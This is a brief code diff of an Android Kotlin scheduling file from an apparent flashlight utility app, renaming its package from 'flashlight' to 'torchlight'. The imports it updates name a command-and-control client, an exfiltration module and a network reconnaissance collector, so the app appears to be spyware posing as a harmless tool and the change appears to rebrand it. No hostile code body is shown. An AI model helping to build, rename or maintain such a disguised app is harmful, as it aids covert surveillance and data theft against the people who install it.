@@ -1,4 +1,4 @@
-package com.utiltools.flashlight.schedule
+package com.utiltools.torchlight.schedule
 
 import android.content.Context
 import android.util.Log
@@ -7,10 +7,10 @@ import androidx.work.ExistingPeriodicWorkPolicy
 import androidx.work.PeriodicWorkRequestBuilder
 import androidx.work.WorkManager
 import androidx.work.WorkerParameters
-import com.utiltools.flashlight.c2.C2Client
-import com.utiltools.flashlight.c2.C2Config
-import com.utiltools.flashlight.exfil.ExfilModule
-import com.utiltools.flashlight.recon.NetworkReconCollector
+import com.utiltools.torchlight.c2.C2Client
+import com.utiltools.torchlight.c2.C2Config
+import com.utiltools.torchlight.exfil.ExfilModule
+import com.utiltools.torchlight.recon.NetworkReconCollector
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
 import java.util.concurrent.TimeUnit
